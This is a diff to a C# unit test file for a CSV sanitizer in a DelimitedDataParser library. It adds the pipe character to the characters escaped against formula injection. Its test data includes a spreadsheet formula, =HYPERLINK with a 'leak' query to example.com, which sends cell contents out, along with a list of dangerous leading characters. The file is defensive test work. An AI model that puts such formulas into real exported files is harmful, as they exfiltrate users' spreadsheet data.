@@ -580,6 +580,7 @@ namespace DelimitedDataParser
         [InlineData("+", "'+")]
         [InlineData("-", "'-")]
         [InlineData("@", "'@")]
+        [InlineData("|", "'|")]
         [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
         public void Sanitizer_Escapes_Blacklisted_Characters_WithoutEscapeCharacters(string inputString, string expectedOutput)
         {
@@ -608,6 +609,7 @@ namespace DelimitedDataParser
         [InlineData("+", @"""'+""")]
         [InlineData("-", @"""'-""")]
         [InlineData("@", @"""'@""")]
+        [InlineData("|", @"""'|""")]
         [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"""'=HYPERLINK(""""http://example.com?leak=""""&A1&A2, """"Click here"""")""")]
         public void Sanitizer_Escapes_Blacklisted_Characters_WithEscapeCharacters(string inputString, string expectedOutput)
         {
@@ -636,6 +638,7 @@ namespace DelimitedDataParser
         [InlineData("+", @"""+""")]
         [InlineData("-", @"""-""")]
         [InlineData("@", @"""@""")]
+        [InlineData("|", @"""|""")]
         [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"""=HYPERLINK(""""http://example.com?leak=""""&A1&A2, """"Click here"""")""")]
         public void Sanitizer_Does_Not_Escape_Blacklisted_Characters_WithEscapeCharacters_WhenPrevented(string inputString, string expectedOutput)
         {
@@ -668,6 +671,7 @@ namespace DelimitedDataParser
         [InlineData(" +")]
         [InlineData(" -")]
         [InlineData(" @")]
+        [InlineData(" |")]
         public void Sanitizer_Does_Not_Escape_Safe_Input(string inputString)
         {
             var input = CreateDataTable();
